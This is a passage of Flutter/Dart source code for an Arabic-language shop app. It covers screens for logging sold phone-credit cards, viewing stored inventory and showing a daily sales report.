                controller: _categoryCtrl,
                style: const TextStyle(color: Colors.white),
                decoration: const InputDecoration(labelText: 'فئة الكارت (5000 أو 10000)', labelStyle: TextStyle(color: Colors.white60)),
              ),
              const SizedBox(height: 10),
              TextField(
                controller: _priceCtrl,
                keyboardType: TextInputType.number,
                style: const TextStyle(color: Colors.white),
                decoration: const InputDecoration(labelText: 'السعر (د.ع)', labelStyle: TextStyle(color: Colors.white60)),
              ),
            ],
          ),
        ),
        actions: [
          TextButton(onPressed: () => Navigator.pop(context), child: const Text('إلغاء', style: TextStyle(color: Colors.grey))),
          ElevatedButton(
            style: ElevatedButton.styleFrom(backgroundColor: const Color(0xFF10B981)),
            onPressed: () {
              if (_networkCtrl.text.isNotEmpty && _categoryCtrl.text.isNotEmpty) {
                setState(() {
                  _balancesList.add({
                    'network': _networkCtrl.text.trim(),
                    'category': _categoryCtrl.text.trim(),
                    'price': _priceCtrl.text.trim(),
                    'date': DateTime.now().toString().substring(0, 16),
                  });
                });
                _saveBalances();
                Navigator.pop(context);
              }
            },
            child: const Text('حفظ', style: TextStyle(color: Colors.white)),
          ),
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: const Text('إدارة وبيع الأرصده'), backgroundColor: const Color(0xFF1E293B)),
      body: _balancesList.isEmpty
          ? const Center(child: Text('لم يتم تسجيل أي رصيد مباع بعد', style: TextStyle(color: Colors.white60)))
          : ListView.builder(
              padding: const EdgeInsets.all(15),
              itemCount: _balancesList.length,
              itemBuilder: (context, index) {
                var item = _balancesList[index];
                return Card(
                  color: const Color(0xFF1E293B),
                  child: ListTile(
                    leading: const Icon(Icons.sim_card, color: Colors.greenAccent, size: 35),
                    title: Text('شركة: ${item['network']} - فئة: ${item['category']}', style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
                    subtitle: Text('السعر: ${item['price']} د.ع\nالوقت: ${item['date']}', style: const TextStyle(color: Colors.white60)),
                    trailing: IconButton(
                      icon: const Icon(Icons.delete, color: Colors.redAccent),
                      onPressed: () {
                        setState(() => _balancesList.removeAt(index));
                        _saveBalances();
                      },
                    ),
                  ),
                );
              },
            ),
      floatingActionButton: FloatingActionButton(
        backgroundColor: const Color(0xFF10B981),
        onPressed: _showAddBalanceDialog,
        child: const Icon(Icons.add, color: Colors.white),
      ),
    );
  }
}

class InventoryScreen extends StatefulWidget {
  const InventoryScreen({Key? key}) : super(key: key);

  @override
  _InventoryScreenState createState() => _InventoryScreenState();
}

class _InventoryScreenState extends State<InventoryScreen> {
  List _products = [];

  @override
  void initState() {
    super.initState();
    _loadAllProducts();
  }

  Future<void> _loadAllProducts() async {
    final prefs = await SharedPreferences.getInstance();
    String? raw = prefs.getString('saved_products');
    if (raw != null) {
      setState(() => _products = jsonDecode(raw));
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: const Text('عرض المواد بالمخزن'), backgroundColor: const Color(0xFF1E293B)),
      body: _products.isEmpty
          ? const Center(child: Text('لا توجد مواد مخزنة مسجلة بعد', style: TextStyle(color: Colors.white60)))
          : ListView.builder(
              padding: const EdgeInsets.all(15),
              itemCount: _products.length,
              itemBuilder: (context, index) {
                var p = _products[index];
                return Card(
                  color: const Color(0xFF1E293B),
                  child: ListTile(
                    leading: const Icon(Icons.inventory_2, color: Colors.teal, size: 35),
                    title: Text(p['name'], style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
                    subtitle: Text('الباركود: ${p['barcode'].isEmpty ? "بدون باركود" : p['barcode']}\nالكمية: ${p['qty']}', style: const TextStyle(color: Colors.white60)),
                    trailing: Text('${p['price']} د.ع', style: const TextStyle(color: Colors.greenAccent, fontWeight: FontWeight.bold)),
                  ),
                );
              },
            ),
    );
  }
}

class ReportsScreen extends StatelessWidget {
  const ReportsScreen({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: const Text('التقارير والأرباح'), backgroundColor: const Color(0xFF1E293B)),
      body: Padding(
        padding: const EdgeInsets.all(20.0),
        child: Column(
          children: [
            Card(
              color: const Color(0xFF1E293B),
              child: const ListTile(
                leading: Icon(Icons.trending_up, color: Colors.purple, size: 40),
                title: Text('إجمالي المبيعات اليومية', style: TextStyle(color: Colors.white60)),
                subtitle: Text('125,000 د.ع', style: TextStyle(color: Colors.white, fontSize: 22, fontWeight: FontWeight.bold)),
              ),
            ),
          ],
        ),
      ),
    );
  }
}
